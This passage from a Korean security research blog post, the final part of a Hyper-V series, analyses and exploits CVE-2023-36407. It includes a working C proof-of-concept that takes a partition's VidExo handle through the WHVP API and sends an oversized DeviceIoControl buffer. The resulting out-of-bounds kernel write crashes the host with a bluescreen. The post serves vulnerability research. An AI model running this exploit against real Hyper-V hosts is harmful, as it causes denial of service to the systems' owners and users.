	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* payload = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &amp;amp;cap, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(cap), &amp;amp;size);

	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (cap.HypervisorPresent == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
	{
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hypervisor is not present\n&amp;quot;&lt;/span&gt;);
		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;;
	}

	WHvCreatePartition(&amp;amp;prtn);

	val = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//processor cnt&lt;/span&gt;
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &amp;amp;val, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(val));

	WHvSetupPartition(prtn);

	WHvDeletePartition(prtn);
}&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;Exploitation-Denial-of-Service&#34;&gt;&lt;a href=&#34;#Exploitation-Denial-of-Service&#34; class=&#34;headerlink&#34; title=&#34;Exploitation - Denial of Service&#34;&gt;&lt;/a&gt;Exploitation - Denial of Service&lt;/h1&gt;&lt;p&gt;&amp;#xB2E4;&amp;#xC2DC; &amp;#xBCF8;&amp;#xB860;&amp;#xC73C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC640;&amp;#xC11C; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;! &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;WinHvSetVpState&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; OOB Write&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCEE4;&amp;#xB110; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB4E4;&amp;#xC744; &amp;#xC624;&amp;#xC5FC;&amp;#xC2DC;&amp;#xCF1C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0A4;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; Denial of Service&amp;#xB97C; &amp;#xB2EC;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;quot;WinHvPlatform.h&amp;quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; OOB_WRITE_CTL_CODE 0x221268&lt;/span&gt;
&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;define&lt;/span&gt; OOB_SIZE 0x10000&lt;/span&gt;

&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;
main()
{
	WHV_PARTITION_HANDLE prtn;
	WHV_CAPABILITY cap;
	&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; size, val;
	&lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt;* payload = &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;;

	WHvGetCapability(WHvCapabilityCodeHypervisorPresent, &amp;amp;cap, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(cap), &amp;amp;size);

	&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (cap.HypervisorPresent == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
	{
		&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Hypervisor is not present\n&amp;quot;&lt;/span&gt;);
		&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;-1&lt;/span&gt;;
	}

	WHvCreatePartition(&amp;amp;prtn);

	val = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;&lt;span class=&#34;hljs-comment&#34;&gt;//processor cnt&lt;/span&gt;
	WHvSetPartitionProperty(prtn, WHvPartitionPropertyCodeProcessorCount, &amp;amp;val, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(val));

	WHvSetupPartition(prtn);

	HANDLE VidExo = (HANDLE)(*((__int64*)prtn + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xfffffffffffffffe&lt;/span&gt;);

	payload = &lt;span class=&#34;hljs-built_in&#34;&gt;malloc&lt;/span&gt;(OOB_SIZE);
	&lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(payload, &lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;, OOB_SIZE);

	&lt;span class=&#34;hljs-comment&#34;&gt;//exploit&lt;/span&gt;
	DeviceIoControl(VidExo, OOB_WRITE_CTL_CODE, payload, OOB_SIZE, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);

	&lt;span class=&#34;hljs-built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;%p\n&amp;quot;&lt;/span&gt;, VidExo);

	getc(&lt;span class=&#34;hljs-built_in&#34;&gt;stdin&lt;/span&gt;);

	WHvDeletePartition(prtn);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC704; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xBCF4;&amp;#xC2DC;&amp;#xBA74; &lt;code&gt;CreateFileA&lt;/code&gt;&amp;#xB098; &lt;code&gt;CreateFileW&lt;/code&gt;&amp;#xB85C; &amp;#xD568;&amp;#xC218;&amp;#xB85C; &lt;code&gt;\Device\VidExo&lt;/code&gt;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xC5BB;&amp;#xB294; &amp;#xAC83;&amp;#xC774; &amp;#xC544;&amp;#xB2CC; WHVP API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD574;&amp;#xC11C; &amp;#xC0DD;&amp;#xC131;&amp;#xD55C; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xB294;&amp;#xB370;&amp;#xC694;? &lt;code&gt;\Device\VidExo&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xC774; &amp;#xBD88;&amp;#xAC00;&amp;#xB2A5;&amp;#xD55C; &amp;#xAC83;&amp;#xC740; &amp;#xC544;&amp;#xB2C8;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &lt;code&gt;CreateFile&lt;/code&gt;&amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; &lt;code&gt;DeviceIoControl&lt;/code&gt;&amp;#xB294; &lt;code&gt;WinHvGet/SetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xAC00; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC720;&amp;#xC800;&amp;#xBAA8;&amp;#xB4DC; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;CreateFile&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD574;&amp;#xC11C; &lt;code&gt;VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC774; &amp;#xC0DD;&amp;#xC131;&amp;#xB420; &amp;#xB54C; &lt;code&gt;Vid.sys&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xB9CC;&amp;#xB4E4;&amp;#xC5B4;&amp;#xC9C0;&amp;#xACE0; &amp;#xC774; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;Exo&lt;/code&gt;&amp;#xC640; &lt;code&gt;Prtn&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;VidExopIoControlPreProcess&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &lt;code&gt;fscontext&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xC2DC;&amp;#xADF8;&amp;#xB2C8;&amp;#xCC98;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5A4; &amp;#xD0C0;&amp;#xC785;&amp;#xC778;&amp;#xC9C0; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;...
 fscontext = v11 &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xFFFFFFFFFFFFFFFC&lt;/span&gt;ui64;&lt;span class=&#34;hljs-comment&#34;&gt;// *(DWORD*)fscontext == &amp;apos; oxE&amp;apos;&lt;/span&gt;
 &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( fscontext )
 {
   if ( *(_DWORD *)fscontext != &amp;apos; oxE&amp;apos; )
   {
     if ( *(_DWORD *)fscontext != &amp;apos;ntrP&amp;apos; )
 ...&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;WinHvGet/SetVpState&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &lt;code&gt;VidExoIoControlPartition&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB294; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &lt;code&gt;Prtn&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC778; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0; &amp;#xD638;&amp;#xCD9C;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC77C;&amp;#xBC18;&amp;#xC801;&amp;#xC778; &lt;code&gt;CreateFile&lt;/code&gt;&amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xB85C; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C4; &lt;code&gt;\Device\VidExo&lt;/code&gt; &amp;#xD578;&amp;#xB4E4;&amp;#xC740; &lt;code&gt;Exo&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC774;&amp;#xAE30; &amp;#xB54C;&amp;#xBB38;&amp;#xC5D0; &amp;#xCDE8;&amp;#xC57D;&amp;#xD55C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC774; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xB294; &amp;#xAC70;&amp;#xC8E0;&amp;#x2026;&lt;/p&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB7FC; Prtn &amp;#xD0C0;&amp;#xC785;&amp;#xC758; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD578;&amp;#xB4E4;&amp;#xC740; &amp;#xC5B4;&amp;#xB5BB;&amp;#xAC8C; &amp;#xC5BB;&amp;#xC744; &amp;#xC218; &amp;#xC788;&amp;#xC744;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xC758; WHVP API&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xAC00;&amp;#xC0C1;&amp;#xBA38;&amp;#xC2E0;&amp;#xC744; &amp;#xAD6C;&amp;#xB3D9;&amp;#xD558;&amp;#xB294; qemu &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; &amp;#xD578;&amp;#xB4E4; &amp;#xBAA9;&amp;#xB85D;&amp;#xC744; &amp;#xBCF4;&amp;#xBA74; &lt;code&gt;\Device\VidExo&lt;/code&gt;&amp;#xC758; &amp;#xD578;&amp;#xB4E4;&amp;#xC774; &amp;#xB450; &amp;#xAC1C; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/image8.png&#34; alt=&#34;image8.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB4E4;&amp;#xC740; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;Exo&lt;/code&gt;, &lt;code&gt;Prtn&lt;/code&gt; &amp;#xD0C0;&amp;#xC785;&amp;#xC758; &lt;code&gt;VidExo&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xD578;&amp;#xB4E4;&amp;#xC774;&amp;#xACE0; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;WHvSetupPartition&lt;/code&gt; &amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;Prtn&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8; &amp;#xD578;&amp;#xB4E4;&amp;#xC774; &amp;#xC5BB;&amp;#xC5B4;&amp;#xC9C0;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC5EC;&amp;#xAE30;&amp;#xC11C; &amp;#xD638;&amp;#xCD9C;&amp;#xB418;&amp;#xB294; &lt;code&gt;CreateFileW&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC758; &amp;#xC778;&amp;#xC790;&amp;#xB85C;&amp;#xB294; &lt;code&gt;\\?\VidExo\&lt;/code&gt;&amp;#xC5D0; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158;&amp;#xC758; GUID&amp;#xB85C; &amp;#xBCF4;&amp;#xC774;&amp;#xB294; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xC5B4; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB418;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/12/pwndorei/newjeans-hyper-v-pt7/image9.png&#34; alt=&#34;image9.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xBC18;&amp;#xD658;&amp;#xB41C; &amp;#xD578;&amp;#xB4E4;&amp;#xC740; 1&amp;#xACFC; OR&amp;#xB418;&amp;#xC5B4; &lt;code&gt;WHvSetupPartition&lt;/code&gt;&amp;#xD568;&amp;#xC218; &amp;#xD638;&amp;#xCD9C;&amp;#xC758; &amp;#xCCAB; &amp;#xBC88;&amp;#xC9F8; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC804;&amp;#xB2EC;&amp;#xD55C; &amp;#xD30C;&amp;#xD2F0;&amp;#xC158; &amp;#xD578;&amp;#xB4E4;(&lt;code&gt;WHV_PARTITION_HANDLE&lt;/code&gt;) + 8&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xACE0; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787; &amp;#xCF54;&amp;#xB4DC;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC77D;&amp;#xC5B4; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;HANDLE VidExo = (HANDLE)(*((__int64*)prtn + &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &amp;amp; &lt;span class=&#34;hljs-number&#34;&gt;0xfffffffffffffffe&lt;/span&gt;);&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xAC00;&amp;#xC838;&amp;#xC628; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; OOB Read/Write&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBC84;&amp;#xD37C;(0x1000)&amp;#xBCF4;&amp;#xB2E4; &amp;#xB9E4;&amp;#xC6B0; &amp;#xD070; &amp;#xD06C;&amp;#xAE30;(0x10000)&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; input&amp;#xC73C;&amp;#xB85C; &lt;code&gt;DeviceIoControl&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; OOB Write&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD558;&amp;#xACE0; &amp;#xCEE4;&amp;#xB110; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xB97C; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC2DC;&amp;#xD0B5;&amp;#xB2C8;&amp;#xB2E4;!&lt;/p&gt;
&lt;p&gt;PoC&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xBE14;&amp;#xB8E8;&amp;#xC2A4;&amp;#xD06C;&amp;#xB9B0;&amp;#xC774; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;!.&lt;/p&gt;
&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/O7LLnyv1Pas?si=31L-nncsQa95NOYo&#34; title=&#34;YouTube video player&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; allowfullscreen&gt;&lt;/iframe&gt;


&lt;h1 id=&#34;The-End&#34;&gt;&lt;a href=&#34;#The-End&#34; class=&#34;headerlink&#34; title=&#34;The End&#34;&gt;&lt;/a&gt;The End&lt;/h1&gt;&lt;p&gt;&amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8; 7&amp;#xC744; &amp;#xB05D;&amp;#xC73C;&amp;#xB85C; &amp;#xC800;&amp;#xC758; &amp;#xCCAB; &amp;#xC5F0;&amp;#xAD6C;&amp;#xAE00; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;&amp;#xAC00; &amp;#xB05D;&amp;#xC774; &amp;#xB0AC;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xD30C;&amp;#xD2B8; 5&amp;#xAE4C;&amp;#xC9C0; &amp;#xB2E4;&amp;#xB8EC; CVE-2018-0959&amp;#xC758; &amp;#xBD84;&amp;#xC11D;&amp;#xACFC; &amp;#xC775;&amp;#xC2A4;&amp;#xD50C;&amp;#xB85C;&amp;#xC787;&amp;#xC774; &amp;#xB05D;&amp;#xB09C; &amp;#xC2DC;&amp;#xC810;&amp;#xC5D0;&amp;#xC11C; Hyper-V &amp;#xCDE8;&amp;#xC57D;&amp;#xC810; &amp;#xC5F0;&amp;#xAD6C;&amp;#xB294; &amp;#xB354;&amp;#xC774;&amp;#xC0C1; &amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC744; &amp;#xC904;&amp;#xB85C;&amp;#xB9CC; &amp;#xC54C;&amp;#xC558;&amp;#xC73C;&amp;#xB098; &amp;#xC57D;&amp;#xAC04;&amp;#xC758; &amp;#xBBF8;&amp;#xB828;&amp;#xC774; &amp;#xB0A8;&amp;#xC544; diffing &amp;#xD574;&amp;#xBCF8; 1-day&amp;#xAC00; &amp;#xC5B4;&amp;#xCC0C;&amp;#xC800;&amp;#xCC0C; &amp;#xB8E8;&amp;#xD2B8; &amp;#xCEE4;&amp;#xC988; &amp;#xBD84;&amp;#xC11D;&amp;#xACFC; LPE&amp;#xB294; &amp;#xC544;&amp;#xB2C8;&amp;#xC9C0;&amp;#xB9CC; PoC&amp;#xAE4C;&amp;#xC9C0; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xC5FC;&amp;#xC744; &amp;#xD1A0;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#x2026; &amp;#xC5EC;&amp;#xAE30;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC628; &amp;#xC774;&amp;#xC0C1; &amp;#xC9C4;&amp;#xC9DC;&amp;#xB85C; Hyper-V&amp;#xB97C; &amp;#xB193;&amp;#xC544;&amp;#xC904; &amp;#xC218; &amp;#xC5C6;&amp;#xAC8C; &amp;#xB418;&amp;#xC5C8;&amp;#xB124;&amp;#xC694; &lt;/p&gt;
&lt;p&gt;&amp;#xC7A0;&amp;#xAE50; &amp;#xC9C0;&amp;#xB09C; &amp;#xB0A0;&amp;#xB4E4;&amp;#xC758; &amp;#xCD94;&amp;#xC5B5;&amp;#xC744; &amp;#xB5A0;&amp;#xC62C;&amp;#xB824; &amp;#xBD24;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#xB9CC; &amp;#xACB0;&amp;#xB860;&amp;#xC801;&amp;#xC73C;&amp;#xB85C;&amp;#xB294; NewJeans&amp;#x2019; Hyper-V &amp;#xC5F0;&amp;#xAD6C;&amp;#xAE00; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;&amp;#xB294; &amp;#xB354;&amp;#xC774;&amp;#xC0C1; &amp;#xB04C;&amp;#xACE0;&amp;#xAC00;&amp;#xBA74; &amp;#xB108;&amp;#xBB34; &amp;#xB8E8;&amp;#xC988;&amp;#xD574;&amp;#xC9C0;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC544;&amp;#xC11C; &amp;#xB05D;&amp;#xB098;&amp;#xC9C0;&amp;#xB9CC; &amp;#xC800;&amp;#xC758; Hyper-V &amp;#xC0AC;&amp;#xB791;&amp;#xC740; &amp;#xC544;&amp;#xC9C1; &amp;#xC2DD;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xB2E4;&amp;#xB294; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4; &amp;gt;_-&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xBB34;&amp;#xD2BC; &amp;#xAE34; &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988; &amp;#xC77D;&amp;#xC5B4;&amp;#xC8FC;&amp;#xC154;&amp;#xC11C; &amp;#xAC10;&amp;#xC0AC;&amp;#xD558;&amp;#xACE0; &amp;#xB2E4;&amp;#xC74C;&amp;#xC5D0; &amp;#xB354; &amp;#xC7AC;&amp;#xBBF8;&amp;#xC788;&amp;#xB294; &amp;#xC8FC;&amp;#xC81C;&amp;#xB85C; &amp;#xB3CC;&amp;#xC544;&amp;#xC624;&amp;#xACA0;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! ^^7&lt;/p&gt;
&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://hvinternals.blogspot.com/2020/06/hyper-v-memory-internals-exo-partition.html&#34;&gt;Hyper-V memory internals. EXO partition memory access&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/gerhart_x&#34;&gt;Gerhart&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
 - hack &amp; life">
  <meta property="og:image" content="https://hackyboiz.github.io/2024/05/12/pwndorei/newjeans-hyper-v-pt7/index.png">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2024/05/12/pwndorei/newjeans-hyper-v-pt7/">

  <title>[Research] NewJeans Hyper-V Part 7 - CVE-2023-36407 Analysis &amp; Exploitation - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
